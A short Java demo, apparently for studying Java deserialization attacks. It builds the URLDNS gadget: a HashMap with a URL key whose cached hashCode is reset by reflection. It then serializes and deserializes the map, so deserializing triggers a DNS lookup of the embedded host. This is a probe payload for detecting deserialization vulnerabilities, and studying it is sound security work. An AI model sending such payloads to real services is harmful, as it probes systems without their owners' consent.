package com.SugarP1g.deserialization.urldns;

import java.io.*;
import java.lang.reflect.Field;
import java.net.*;
import java.util.HashMap;


public class Demo {

    public static void main(String[] args) throws Exception {
        URLStreamHandler handler = new SilentURLStreamHandler();
        String url = "http://www.baidu.com";
        URL u = new URL(null, url, handler); // URL to use as the Key
        HashMap ht = new HashMap(); // HashMap that will contain the URL
        ht.put(u, url);

        Field field = u.getClass().getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(u, -1);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(ht);
        oos.close();
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new
                ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
    }

    static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
}
